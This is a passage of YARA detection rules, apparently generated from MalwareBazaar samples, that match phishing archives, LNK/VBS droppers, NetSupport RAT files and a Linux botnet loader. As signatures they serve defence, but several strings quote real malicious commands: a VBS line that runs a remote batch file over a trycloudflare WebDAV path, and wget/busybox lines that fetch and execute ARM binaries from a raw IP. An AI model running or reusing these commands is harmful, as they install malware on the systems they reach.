      $s5 = "58%45%63%4c%58%58%54%70%49%55%59%4d%5a%21%65%3c%70%39%25%70%27%53%51%54%45%58%4d%46%50%49%65%63%47%53%52%58%49%52%58%21%65%2d%29" ascii /* hex encoded string 'XEcLXXTpIUYMZ!e<p9%p'SQTEXMFPIecGSRXIRX!e-)' */
      $s6 = "4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37%48%49%3e%28%25%5a%5a%5c%28%4e%5c%5e%54%37%4c%2a%27%59%34%3e%32%4b%39%4e%3b%25%51%37%3c" ascii /* hex encoded string 'MGK[4=I&2-%;57HI>(%ZZ\(N\^T7L*'Y4>2K9N;%Q7<' */
      $s7 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%2d%52%5a%53%4f%29%70%49%3c%34%36%49%57" ascii /* hex encoded string 'cccccccccccccccccccccccccccccc-RZSO)pI<46IW' */
      $s8 = "30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e%2b%4d%50%4d%58%55%2c%5c%4b%5e%4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37" ascii /* hex encoded string '0EH%=O:>5L4]VESF9<>+MPMXU,\K^MGK[4=I&2-%;57' */
      $s9 = "33%29%2e%50%2f%39%2e%2e%4c%59%45%5a%4a%53%4f%2b%26%4b%28%49%2d%25%58%39%30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e" ascii /* hex encoded string '3).P/9..LYEZJSO+&K(I-%X90EH%=O:>5L4]VESF9<>' */
      $s10 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%30%3a%26%4c%47%76" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K0:&LGv' */
      $s11 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%29%2a%4f%36%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-)*O6'' */
      $s12 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%70%47%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccccccccccccccpGcccccccccccccccccc' */
      $s13 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%6c%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccclccccccc' */
      $s14 = "48%2f%3d%5a%4c%3d%3d%4f%31%2b%38%4d%4a%46%57%35%45%3c%3c%50%2c%39%3d%38%31%2b%39%3e%46%48%33%38%37%56%4a%31%3d%49%31%25%37%47%50" ascii /* hex encoded string 'H/=ZL==O1+8MJFW5E<<P,9=81+9>FH387VJ1=I1%7GP' */
      $s15 = "4f%51%3e%4f%29%4a%28%55%47%29%33%45%53%4b%2a%57%3c%57%5e%4d%58%35%4c%57%2b%39%30%25%31%45%50%31%52%4c%48%2f%3d%5a%4c%3d%3d%4f%31" ascii /* hex encoded string 'OQ>O)J(UG)3ESK*W<W^MX5LW+90%1EP1RLH/=ZL==O1' */
      $s16 = "58%39%73%5c%50%36%3c%25%53%31%5d%4f%7a%45%39%78%3b%38%73%58%50%30%3b%3a%3d%47%2c%2e%2a%39%74%32%54%38%75%77%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'X9s\P6<%S1]OzE9x;8sXP0;:=G,.*9t2T8uwK-'%K-'' */
      $s17 = "63%63%63%63%63%63%63%63%63%63%63%63%6b%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccckcccccccccccccccccccccccccccccc' */
      $s18 = "54%56%31%5a%58%5d%5e%3b%32%2c%49%3b%2d%2c%53%3e%34%26%3c%53%50%26%5b%2a%4d%50%4b%29%55%36%55%4f%51%3e%4f%29%4a%28%55%47%29%33%45" ascii /* hex encoded string 'TV1ZX]^;2,I;-,S>4&<SP&[*MPK)U6UOQ>O)J(UG)3E' */
      $s19 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccccccccccc' */
      $s20 = "63%63%63%63%63%63%63%63%63%63%65%57%27%56%4d%34%38%71%57%2c%49%30%30%65%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccceW'VM48qW,I00eccccccccccccccccccc' */
   condition:
      uint16(0) == 0x733c and filesize < 100KB and
      8 of them
}

rule df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea9aef63 {
   meta:
      description = "evidences - file df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea9aef63.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "df215a01f6a83014a148c6e407cdc8422e9119a88b4220a1321b2986ea9aef63"
   strings:
      $s1 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%45%76%48%74%46%75%50%4c%2f%38%57%52%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%KEvHtFuPL/8WR-'%K-'%K-'%K-'' */
      $s2 = "45%35%59%2a%55%26%5c%71%49%3c%54%25%52%48%49%52%3a%4d%56%53%32%51%29%32%58%57%38%36%2d%52%2b%37%6b%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'E5Y*U&\qI<T%RHIR:MVS2Q)2XW86-R+7kcccccccccc' */
      $s3 = "58%5e%26%34%33%31%2e%45%26%2d%28%2b%49%45%35%59%2a%55%26%5c%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'X^&431.E&-(+IE5Y*U&\ccccccccccccccccccccccc' */
      $s4 = "54%46%52%35%59%48%51%2e%38%2d%4b%21%21%6a%6e%3f%27%2c%45%36%41%73%5c%75%75%6e%6a%6c%6c%6a%6c%6c%6c%65%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'TFR5YHQ.8-K!!jn?',E6As\uunjlljllleccccccccc' */
      $s5 = "58%45%63%4c%58%58%54%70%49%55%59%4d%5a%21%65%3c%70%39%25%70%27%53%51%54%45%58%4d%46%50%49%65%63%47%53%52%58%49%52%58%21%65%2d%29" ascii /* hex encoded string 'XEcLXXTpIUYMZ!e<p9%p'SQTEXMFPIecGSRXIRX!e-)' */
      $s6 = "4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37%48%49%3e%28%25%5a%5a%5c%28%4e%5c%5e%54%37%4c%2a%27%59%34%3e%32%4b%39%4e%3b%25%51%37%3c" ascii /* hex encoded string 'MGK[4=I&2-%;57HI>(%ZZ\(N\^T7L*'Y4>2K9N;%Q7<' */
      $s7 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%2d%52%5a%53%4f%29%70%49%3c%34%36%49%57" ascii /* hex encoded string 'cccccccccccccccccccccccccccccc-RZSO)pI<46IW' */
      $s8 = "30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e%2b%4d%50%4d%58%55%2c%5c%4b%5e%4d%47%4b%5b%34%3d%49%26%32%2d%25%3b%35%37" ascii /* hex encoded string '0EH%=O:>5L4]VESF9<>+MPMXU,\K^MGK[4=I&2-%;57' */
      $s9 = "33%29%2e%50%2f%39%2e%2e%4c%59%45%5a%4a%53%4f%2b%26%4b%28%49%2d%25%58%39%30%45%48%25%3d%4f%3a%3e%35%4c%34%5d%56%45%53%46%39%3c%3e" ascii /* hex encoded string '3).P/9..LYEZJSO+&K(I-%X90EH%=O:>5L4]VESF9<>' */
      $s10 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%30%3a%26%4c%47%76" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K0:&LGv' */
      $s11 = "4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%27%25%4b%2d%29%2a%4f%36%27" ascii /* hex encoded string 'K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-'%K-)*O6'' */
      $s12 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%70%47%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccccccccccccccpGcccccccccccccccccc' */
      $s13 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%6c%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccclccccccc' */
      $s14 = "48%2f%3d%5a%4c%3d%3d%4f%31%2b%38%4d%4a%46%57%35%45%3c%3c%50%2c%39%3d%38%31%2b%39%3e%46%48%33%38%37%56%4a%31%3d%49%31%25%37%47%50" ascii /* hex encoded string 'H/=ZL==O1+8MJFW5E<<P,9=81+9>FH387VJ1=I1%7GP' */
      $s15 = "4f%51%3e%4f%29%4a%28%55%47%29%33%45%53%4b%2a%57%3c%57%5e%4d%58%35%4c%57%2b%39%30%25%31%45%50%31%52%4c%48%2f%3d%5a%4c%3d%3d%4f%31" ascii /* hex encoded string 'OQ>O)J(UG)3ESK*W<W^MX5LW+90%1EP1RLH/=ZL==O1' */
      $s16 = "58%39%73%5c%50%36%3c%25%53%31%5d%4f%7a%45%39%78%3b%38%73%58%50%30%3b%3a%3d%47%2c%2e%2a%39%74%32%54%38%75%77%4b%2d%27%25%4b%2d%27" ascii /* hex encoded string 'X9s\P6<%S1]OzE9x;8sXP0;:=G,.*9t2T8uwK-'%K-'' */
      $s17 = "63%63%63%63%63%63%63%63%63%63%63%63%6b%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccccckcccccccccccccccccccccccccccccc' */
      $s18 = "54%56%31%5a%58%5d%5e%3b%32%2c%49%3b%2d%2c%53%3e%34%26%3c%53%50%26%5b%2a%4d%50%4b%29%55%36%55%4f%51%3e%4f%29%4a%28%55%47%29%33%45" ascii /* hex encoded string 'TV1ZX]^;2,I;-,S>4&<SP&[*MPK)U6UOQ>O)J(UG)3E' */
      $s19 = "63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'ccccccccccccccccccccccccccccccccccccccccccc' */
      $s20 = "63%63%63%63%63%63%63%63%63%63%65%57%27%56%4d%34%38%71%57%2c%49%30%30%65%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63%63" ascii /* hex encoded string 'cccccccccceW'VM48qW,I00eccccccccccccccccccc' */
   condition:
      uint16(0) == 0x733c and filesize < 100KB and
      8 of them
}

rule sig_3f6dcb3c2a0891f5f0894e9a70dc04a7021cb1ee8f61f73fa2f9139d254eded6 {
   meta:
      description = "evidences - file 3f6dcb3c2a0891f5f0894e9a70dc04a7021cb1ee8f61f73fa2f9139d254eded6.lnk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "3f6dcb3c2a0891f5f0894e9a70dc04a7021cb1ee8f61f73fa2f9139d254eded6"
   strings:
      $x1 = "D:\\ico!%SystemRoot%\\System32\\SHELL32.dll" fullword wide
      $s2 = "D:\\ico\\revised_receipt.vbs" fullword wide
      $s3 = "REVISE~1.VBS" fullword ascii
      $s4 = "revised_receipt.vbs" fullword wide
      $s5 = ".\\ico\\revised_receipt.vbs" fullword wide
      $s6 = "ico (D:)" fullword wide
   condition:
      uint16(0) == 0x004c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule sig_56a8b8e7c206693524d6a6ea711b1a6746f67f9f3013adb801d92d315efc2157 {
   meta:
      description = "evidences - file 56a8b8e7c206693524d6a6ea711b1a6746f67f9f3013adb801d92d315efc2157.lnk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "56a8b8e7c206693524d6a6ea711b1a6746f67f9f3013adb801d92d315efc2157"
   strings:
      $x1 = "D:\\ico!%SystemRoot%\\System32\\SHELL32.dll" fullword wide
      $s2 = "D:\\ico\\invoice.vbs" fullword wide
      $s3 = "invoice.vbs" fullword wide
      $s4 = ".\\ico\\invoice.vbs" fullword wide
      $s5 = "ico (D:)" fullword wide
   condition:
      uint16(0) == 0x004c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule sig_6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578 {
   meta:
      description = "evidences - file 6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6ceea753d0dc16cbd140271cc52e4e37113e299bc62a83150d33662830c68578"
   strings:
      $x1 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x2 = "  <script type=\"application/json\" data-target=\"react-app.embeddedData\">{\"payload\":{\"allShortcutsEnabled\":false,\"fileTre" ascii
      $x3 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x4 = "</style><meta data-hydrostats=\"publish\"/> <!-- --> <!-- --> <button hidden=\"\" data-testid=\"header-permalink-button\" data-h" ascii
      $x5 = "  <a id=\"security-tab\" href=\"/Kami32X/Osiris/security\" data-tab-item=\"i5security-tab\" data-selected-links=\"security overv" ascii
      $x6 = "  <a id=\"code-tab\" href=\"/Kami32X/Osiris\" data-tab-item=\"i0code-tab\" data-selected-links=\"repo_source repo_downloads repo" ascii
      $x7 = " Kami32X/Osiris\",\"appPayload\":{\"helpUrl\":\"https://docs.github.com\",\"findFileWorkerPath\":\"/assets-cdn/worker/find-file-" ascii
      $x8 = "  <script type=\"application/json\" id=\"client-env\">{\"locale\":\"en\",\"featureFlags\":[\"alive_longer_retries\",\"bypass_cop" ascii
      $x9 = "            <a href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" id=\"repository-details-watch-button\" data-hydro-" ascii
      $x10 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $x11 = "</div><div class=\"d-flex flex-shrink-0 gap-2\"><div data-testid=\"latest-commit-details\" class=\"d-none d-sm-flex flex-items-c" ascii
      $x12 = " Kami32X/Osiris\" /><meta property=\"og:url\" content=\"https://github.com/Kami32X/Osiris/blob/main/2klz.exe\" /><meta property=" ascii
      $x13 = "thub.com\",\"isGitLfs\":false,\"onBranch\":true,\"shortPath\":\"c2a2ff3\",\"siteNavLoginPath\":\"/login?return_to=https%3A%2F%2F" ascii
      $s14 = "        <a href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" data-hydro-click=\"{&quot;event_type&quot;:&quot;authe" ascii
      $s15 = "          <a icon=\"repo-forked\" id=\"fork-button\" href=\"/login?return_to=%2FKami32X%2FOsiris\" rel=\"nofollow\" data-hydro-c" ascii
      $s16 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $s17 = "\"https://avatars.githubusercontent.com/u/171483775?v=4\",\"public\":true,\"private\":false,\"isOrgOwned\":false},\"codeLineWrap" ascii
      $s18 = "  <a id=\"insights-tab\" href=\"/Kami32X/Osiris/pulse\" data-tab-item=\"i6insights-tab\" data-selected-links=\"repo_graphs repo_" ascii
      $s19 = "  <a class=\"HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary\" data-analytics-event=\"{&quo" ascii
      $s20 = "  <a id=\"pull-requests-tab\" href=\"/Kami32X/Osiris/pulls\" data-tab-item=\"i2pull-requests-tab\" data-selected-links=\"repo_pu" ascii
   condition:
      uint16(0) == 0x0a0a and filesize < 700KB and
      1 of ($x*) and all of them
}

rule afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc629ae5b {
   meta:
      description = "evidences - file afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc629ae5b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "afaa6ce46908258e8fe8f1cc0c312b203872e4b8dd12f41fe938879bc629ae5b"
   strings:
      $x1 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x2 = "  <script type=\"application/json\" data-target=\"react-app.embeddedData\">{\"payload\":{\"allShortcutsEnabled\":false,\"fileTre" ascii
      $x3 = "<!-- -->main</span></div></div></span><span data-component=\"trailingVisual\" class=\"prc-Button-Visual-2epfX prc-Button-VisualW" ascii
      $x4 = "</style><meta data-hydrostats=\"publish\"/> <!-- --> <!-- --> <button hidden=\"\" data-testid=\"header-permalink-button\" data-h" ascii
      $x5 = "  <a id=\"code-tab\" href=\"/YoonJae-rep/CVE-2024-49113\" data-tab-item=\"i0code-tab\" data-selected-links=\"repo_source repo_do" ascii
      $x6 = "  <a id=\"security-tab\" href=\"/YoonJae-rep/CVE-2024-49113/security\" data-tab-item=\"i5security-tab\" data-selected-links=\"se" ascii
      $x7 = "</div><div class=\"d-flex flex-shrink-0 gap-2\"><div data-testid=\"latest-commit-details\" class=\"d-none d-sm-flex flex-items-c" ascii
      $x8 = " YoonJae-rep/CVE-2024-49113\",\"appPayload\":{\"helpUrl\":\"https://docs.github.com\",\"findFileWorkerPath\":\"/assets-cdn/worke" ascii
      $x9 = "            <a href=\"/login?return_to=%2FYoonJae-rep%2FCVE-2024-49113\" rel=\"nofollow\" id=\"repository-details-watch-button\"" ascii
      $x10 = "  <script type=\"application/json\" id=\"client-env\">{\"locale\":\"en\",\"featureFlags\":[\"alive_longer_retries\",\"bypass_cop" ascii
      $x11 = "  <script type=\"application/json\" data-target=\"react-partial.embeddedData\">{\"props\":{\"docsUrl\":\"https://docs.github.com" ascii
      $x12 = " YoonJae-rep/CVE-2024-49113\" /><meta property=\"og:url\" content=\"https://github.com/YoonJae-rep/CVE-2024-49113/blob/main/poc." ascii
      $x13 = "  <a id=\"projects-tab\" href=\"/YoonJae-rep/CVE-2024-49113/projects\" data-tab-item=\"i4projects-tab\" data-selected-links=\"re" ascii
      $x14 = "com/YoonJae-rep/CVE-2024-49113/raw/refs/heads/main/poc.exe\">View raw</a></div></section></div></div></div> <!-- --> <!-- --> </" ascii
      $x15 = "  <a id=\"pull-requests-tab\" href=\"/YoonJae-rep/CVE-2024-49113/pulls\" data-tab-item=\"i2pull-requests-tab\" data-selected-lin" ascii
      $x16 = "  <a id=\"issues-tab\" href=\"/YoonJae-rep/CVE-2024-49113/issues\" data-tab-item=\"i1issues-tab\" data-selected-links=\"repo_iss" ascii
      $x17 = "  <a id=\"actions-tab\" href=\"/YoonJae-rep/CVE-2024-49113/actions\" data-tab-item=\"i3actions-tab\" data-selected-links=\"repo_" ascii
      $x18 = "  <a id=\"insights-tab\" href=\"/YoonJae-rep/CVE-2024-49113/pulse\" data-tab-item=\"i6insights-tab\" data-selected-links=\"repo_" ascii
      $s19 = "          <a icon=\"repo-forked\" id=\"fork-button\" href=\"/login?return_to=%2FYoonJae-rep%2FCVE-2024-49113\" rel=\"nofollow\" " ascii
      $s20 = "        <a href=\"/login?return_to=%2FYoonJae-rep%2FCVE-2024-49113\" rel=\"nofollow\" data-hydro-click=\"{&quot;event_type&quot;" ascii
   condition:
      uint16(0) == 0x0a0a and filesize < 700KB and
      1 of ($x*) and all of them
}

rule sig_4e35c67e9f2b3bbb36061eecb39671d44c25ede12f15a87a8237fc2c3988a04b {
   meta:
      description = "evidences - file 4e35c67e9f2b3bbb36061eecb39671d44c25ede12f15a87a8237fc2c3988a04b.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4e35c67e9f2b3bbb36061eecb39671d44c25ede12f15a87a8237fc2c3988a04b"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                            ' */
      $s2 = "remcmdstub.exe" fullword ascii
      $s3 = "PCICHEK.DLL" fullword ascii
      $s4 = "HTCTL32.DLL" fullword ascii
      $s5 = "EmbeddedBrowserWebView.dll" fullword ascii
      $s6 = "PCICL32.DLL" fullword ascii
      $s7 = "webmvorbisencoder.dll" fullword ascii
      $s8 = "TCCTL32.DLL" fullword ascii
      $s9 = "webmmux.dll" fullword ascii
      $s10 = "client32.exe" fullword ascii
      $s11 = "helper/vp8encoder.dll" fullword ascii
      $s12 = "helper/webmmux.dll" fullword ascii
      $s13 = "woot/api-ms-win-core-localization-l1-2-0.dll" fullword ascii
      $s14 = "pcicapi.dll" fullword ascii
      $s15 = "188888" ascii /* reversed goodware string '888881' */
      $s16 = "client32.ini" fullword ascii
      $s17 = "31>!!!" fullword ascii
      $s18 = "nskbfltr.inf" fullword ascii
      $s19 = "|<D* -" fullword ascii
      $s20 = "&&\"&&2*F" fullword ascii /* hex encoded string '/' */
   condition:
      uint16(0) == 0x4b50 and filesize < 27000KB and
      8 of them
}

rule sig_512cd92483ee45cb61b631ab336f08b06f798226fc9f7a0b650e36c7e241ed86 {
   meta:
      description = "evidences - file 512cd92483ee45cb61b631ab336f08b06f798226fc9f7a0b650e36c7e241ed86.vbs"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "512cd92483ee45cb61b631ab336f08b06f798226fc9f7a0b650e36c7e241ed86"
   strings:
      $x1 = "objShell.Run \"cmd.exe /c \\\\superior-somalia-bs-leisure.trycloudflare.com@SSL\\DavWWWRoot\\new.bat\", 0, False" fullword ascii
      $s2 = "Set objShell = CreateObject(\"WScript.Shell\")" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x6553 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_5953ed54bf58bea2db79f92e341e5259d309593c96a9e40380e5e89810a30f6b {
   meta:
      description = "evidences - file 5953ed54bf58bea2db79f92e341e5259d309593c96a9e40380e5e89810a30f6b.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "5953ed54bf58bea2db79f92e341e5259d309593c96a9e40380e5e89810a30f6b"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s2 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s3 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s4 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s5 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s6 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s7 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s8 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f japtrap;" ascii
      $s9 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s10 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s11 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s12 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s13 = ">/home/.a && cd /home;" fullword ascii
      $s14 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s15 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
      $s16 = ">/dev/.a && cd /dev;" fullword ascii
      $s17 = ">/var/.a && cd /var;" fullword ascii
      $s18 = " > .f; # ; rm -rf .f;" fullword ascii
      $s19 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      8 of them
}

rule sig_61188dd5a1d5b843ae36c7104792c1733dfbcdaf4947eca8d67281994a2449b1 {
   meta:
      description = "evidences - file 61188dd5a1d5b843ae36c7104792c1733dfbcdaf4947eca8d67281994a2449b1.7z"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "61188dd5a1d5b843ae36c7104792c1733dfbcdaf4947eca8d67281994a2449b1"
   strings:
      $s1 = "JB#40044  Order.exe" fullword ascii
      $s2 = "llkblc" fullword ascii
      $s3 = "oIXKdP4" fullword ascii
      $s4 = "rjBN<YK" fullword ascii
      $s5 = "wNgY1D:" fullword ascii
      $s6 = "XqbzM'[" fullword ascii
      $s7 = "tFSTS%Uo" fullword ascii
      $s8 = "=wnZN<E:" fullword ascii
      $s9 = "PrxV|xf" fullword ascii
      $s10 = "y`HuUSED30H" fullword ascii
      $s11 = "d03%I=:" fullword ascii
      $s12 = "tJrdn3]R" fullword ascii
      $s13 = "cpHcJ*A" fullword ascii
      $s14 = "eGsycLi" fullword ascii
      $s15 = "pFTDC%Uo" fullword ascii
      $s16 = "uUmC`s]9" fullword ascii
      $s17 = "F3npeDX>g" fullword ascii
      $s18 = "NLuFv_g" fullword ascii
      $s19 = "<`WIBavm~.v" fullword ascii
      $s20 = "PssIzkm" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule sig_6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550 {
   meta:
      description = "evidences - file 6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6b38f23f9be3fcb471acb4e33905a5c9b7cd749e0b572bd9d3a3d4c82316b550"
   strings:
      $s1 = "DHL-DOC8002025.exe" fullword ascii
      $s2 = "A5PuDU\"FupFu- " fullword ascii
      $s3 = "dfimosu" fullword ascii
      $s4 = "XCoM]Yi" fullword ascii
      $s5 = "WUSOMKIG" fullword ascii
      $s6 = "Xmonopr" fullword ascii
      $s7 = "vh)+ 6A<I" fullword ascii
      $s8 = "\\XAJnWlz" fullword ascii
      $s9 = "t=H- 8M" fullword ascii
      $s10 = ">Q* Pc" fullword ascii
      $s11 = "hS09* " fullword ascii
      $s12 = "ubYAWf1" fullword ascii
      $s13 = "cyvgew" fullword ascii
      $s14 = "pl>h/#5+ " fullword ascii
      $s15 = "F2%pM%c" fullword ascii
      $s16 = "bqylfk" fullword ascii
      $s17 = "J1U*+ 0t" fullword ascii
      $s18 = "\\A2%h;" fullword ascii
      $s19 = "HLnB?o8" fullword ascii
      $s20 = "IoXj%>Qg" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782 {
   meta:
      description = "evidences - file e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "e09c72792e2f15b40c07327efbb0ece82c10e7538509a3301fd09188cf8ab782"
   strings:
      $s1 = "DHL-DOC83972025-1.exe" fullword ascii
      $s2 = "dfimosu" fullword ascii
      $s3 = ",jXhw.ZLU" fullword ascii
      $s4 = "X8$d:\\" fullword ascii
      $s5 = "WUSOMKIG" fullword ascii
      $s6 = "Xmonopr" fullword ascii
